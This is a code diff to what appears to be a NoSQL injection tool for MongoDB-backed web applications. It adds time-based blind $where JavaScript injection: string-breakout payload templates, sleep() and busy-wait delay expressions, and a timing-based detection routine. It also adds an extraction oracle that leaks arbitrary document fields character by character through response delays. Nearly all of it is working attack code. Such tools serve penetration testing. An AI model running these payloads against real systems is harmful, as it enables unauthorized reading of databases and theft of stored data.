@@ -48,9 +48,19 @@ _BLOCKING = {403, 406, 429, 501}
 _WHERE_TEMPLATES = [
     ("sq-inline", "' || (%s) || '"),
     ("dq-inline", "\" || (%s) || \""),
+    ("dq-eqeq", "\" || (%s) || \"\"==\""),
+    ("sq-eqeq", "' || (%s) || ''=='"),
     ("sq-fn", "'; return (%s); var _d='"),
     ("dq-fn", "\"; return (%s); var _d=\""),
     ("bare", " || (%s) || "),
+]
+
+# Expressions that induce a measurable delay inside $where (for time-based blind
+# when there is no content signal).  sleep() is gentler; the busy-wait IIFE is
+# portable (works without MongoDB's sleep()).  Each takes a millisecond count.
+_DELAY_EXPRS = [
+    ("sleep", "sleep(%d)"),
+    ("busy", "(function(){var _s=Date.now();while(Date.now()-_s<%d){}})()"),
 ]
 
 
@@ -63,6 +73,8 @@ def args():
         ["--extractMethod", "Extraction backend: auto (default), regex, or where ($where this.field)"],
         ["--dump", "In-band dump: re-send the match-all payload and show the records the injection returns (GET/search endpoints) (y)"],
         ["--discover", "Discover document field/column names ($where Object.keys, else $exists wordlist) (y)"],
+        ["--timeBased", "Time-based blind $where: auto (fall back when content has no signal), y (force), or n (off)"],
+        ["--timeDelay", "Induced delay in milliseconds for time-based blind (default 1000)"],
         ["--noWhere", "Skip the $where JavaScript technique (y)"],
         ["--csrfField", "Form field carrying an anti-CSRF token (carried, refreshed, on every request)"],
         ["--csrfUrl", "URL to GET a fresh CSRF token from (default: the target URL)"],
@@ -320,7 +332,7 @@ def _where_candidates(fields_literal):
 
 
 def detect(base_url, method, fields_literal, headers=None, verify=False,
-           csrf=None, no_where=False, ctx=None):
+           csrf=None, no_where=False, ctx=None, time_based="auto", delay_ms=1000):
     method = method.upper()
     if ctx is None:
         ctx = Ctx(headers, verify, csrf)
@@ -360,6 +372,16 @@ def detect(base_url, method, fields_literal, headers=None, verify=False,
                 "strong": positive and positive2, "status": t.status,
                 "length": t.length, "where": meta,
             })
+
+    # Time-based blind $where: run when forced, or (auto) when no genuine $where
+    # CONTENT finding exists.  Operator-injection findings here are often just
+    # error responses (e.g. "Missing parameter" for an array), which must not
+    # mask a real time-based $where.  Time probes are fast when not vulnerable
+    # (the payload sits inside a string and never executes), so this is cheap.
+    has_where = any(f["strong"] and isinstance(f.get("where"), dict) and not f["where"].get("time")
+                    for f in findings)
+    if not no_where and (time_based == "y" or (time_based == "auto" and not has_where)):
+        findings += _detect_time(ctx, method, base_url, fields_literal, vectors, delay_ms)
     return findings
 
 
@@ -741,6 +763,10 @@ def discover_fields(ctx, method, base_url, vector, fields_literal, findings):
     where = next((f["where"] for f in findings if f.get("where")), None)
 
     if where:
+        if where.get("time"):
+            print("[+] $where (time-based) injection: ARBITRARY fields are readable via this.<field>.")
+            print("    Name the fields with --extract (timing-based key enumeration is impractical).")
+            return []
         keys = discover_where(ctx, method, base_url, vector, fields_literal, where)
         print("[+] $where JavaScript injection: ARBITRARY fields are readable via this.<field>.")
         if keys:
@@ -767,6 +793,67 @@ def discover_fields(ctx, method, base_url, vector, fields_literal, findings):
     return []
 
 
+def _detect_time(ctx, method, base_url, fields_literal, vectors, delay_ms):
+    # Confirm a $where injection purely by response time: inject an unconditional
+    # delay; if it slows (and a no-delay control stays fast), it's time-based.
+    secs = delay_ms / 1000.0
+    for vector in vectors:
+        try:
+            base = [_send(ctx, method, base_url, vector,
+                          {n: ("lit", _rand()) for n in fields_literal}).elapsed for _ in range(4)]
+        except requests.RequestException:
+            continue
+        thr = max(base) + secs * 0.5
+        for field in fields_literal:
+            for tlabel, tmpl in _WHERE_TEMPLATES:
+                for elabel, efmt in _DELAY_EXPRS:
+                    spec = {n: ("lit", fields_literal[n]) for n in fields_literal}
+                    spec[field] = ("lit", tmpl % (efmt % delay_ms))
+                    try:
+                        if _send(ctx, method, base_url, vector, spec).elapsed < thr:
+                            continue
+                        # confirm the delay, and that a no-delay control is fast
+                        t2 = _send(ctx, method, base_url, vector, spec).elapsed
+                        ctrl = dict(spec); ctrl[field] = ("lit", tmpl % "0")
+                        tc = _send(ctx, method, base_url, vector, ctrl).elapsed
+                    except requests.RequestException:
+                        continue
+                    if t2 >= thr and tc < thr:
+                        return [{
+                            "vector": vector,
+                            "label": "$where %s/%s (time:%s)" % (field, tlabel, elabel),
+                            "spec": spec,
+                            "reasons": ["response %.2fs vs baseline %.2fs (induced %dms delay)"
+                                        % (t2, max(base), delay_ms)],
+                            "strong": True, "status": 0, "length": 0,
+                            "where": {"field": field, "template": tmpl, "time": True,
+                                      "delay": delay_ms, "threshold": thr, "efmt": efmt},
+                        }]
+    return []
+
+
+def _where_time_is_true(ctx, method, base_url, vector, fields_literal, inj_field, template, target, meta):
+    efmt = meta.get("efmt", "sleep(%d)")
+    delay = meta["delay"]
+    thr = meta["threshold"]
+    delay_js = efmt % delay
+
+    def probe(js):
+        spec = {n: ("lit", fields_literal[n]) for n in fields_literal}
+        spec[inj_field] = ("lit", template % js)
+        return _send(ctx, method, base_url, vector, spec).elapsed
+
+    def is_true(pattern):
+        jsp = pattern.replace("/", "\\/")
+        cond = "this.%s!=null && /%s/.test(String(this.%s))" % (target, jsp, target)
+        js = "(%s) ? %s : 0" % (cond, delay_js)   # delay only when the char matches
+        try:
+            return probe(js) > thr
+        except requests.RequestException:
+            return False
+    return is_true
+
+
 def extract(base_url, method, vector, fields_literal, field, headers=None, verify=False,
             charset=None, maxlen=64, exclude=None, pin=None, ctx=None, where=None,
             ext_method="auto"):
@@ -784,8 +871,12 @@ def extract(base_url, method, vector, fields_literal, field, headers=None, verif
             return str(typed)
 
     if where and ext_method in ("auto", "where"):
-        wis = _where_is_true(ctx, method, base_url, vector, fields_literal,
-                             where["field"], where["template"], field)
+        if where.get("time"):
+            wis = _where_time_is_true(ctx, method, base_url, vector, fields_literal,
+                                      where["field"], where["template"], field, where)
+        else:
+            wis = _where_is_true(ctx, method, base_url, vector, fields_literal,
+                                 where["field"], where["template"], field)
         if wis:
             return _walk_value(wis, charset, maxlen, label=field, widen=_CHARSET_FULL)
     return None
@@ -920,6 +1011,8 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None)
     csrf = None
     no_where = False
     ext_method = "auto"
+    time_based = "auto"
+    delay_ms = 1000
     if args is not None:
         cf = getattr(args, "csrfField", None)
         if cf:
@@ -927,6 +1020,11 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None)
                     "regex": getattr(args, "csrfRegex", None)}
         no_where = str(getattr(args, "noWhere", "") or "").lower() == "y"
         ext_method = (getattr(args, "extractMethod", None) or "auto").lower()
+        time_based = (getattr(args, "timeBased", None) or "auto").lower()
+        try:
+            delay_ms = int(getattr(args, "timeDelay", None) or 1000)
+        except (ValueError, TypeError):
+            delay_ms = 1000
 
     if csrf:
         fields_literal.pop(csrf["field"], None)
@@ -945,8 +1043,9 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None)
             input("\nPress enter to continue...")
         return []
 
-    ctx = Ctx(headers, verify, csrf)
-    findings = detect(base_url, method, fields_literal, no_where=no_where, ctx=ctx)
+    ctx = Ctx(headers, verify, csrf, timeout=max(15, int(delay_ms / 1000 * 5) + 5))
+    findings = detect(base_url, method, fields_literal, no_where=no_where, ctx=ctx,
+                      time_based=time_based, delay_ms=delay_ms)
 
     print("")
     strong = [f for f in findings if f["strong"]]
@@ -975,6 +1074,9 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None)
             if any(f["label"].startswith("$where") for f in strong):
                 print("\n[!] $where JAVASCRIPT injection confirmed: arbitrary fields are")
                 print("    extractable via this.<field> (even fields the form never submits).")
+            if any(isinstance(f.get("where"), dict) and f["where"].get("time") for f in strong):
+                print("\n[!] TIME-BASED blind: no content signal, the oracle is response delay.")
+                print("    Extraction works the same way but is slower (tune with --timeDelay).")
 
         if weak:
             print("\n=== POSSIBLE (status-only change, may be a WAF) ===")
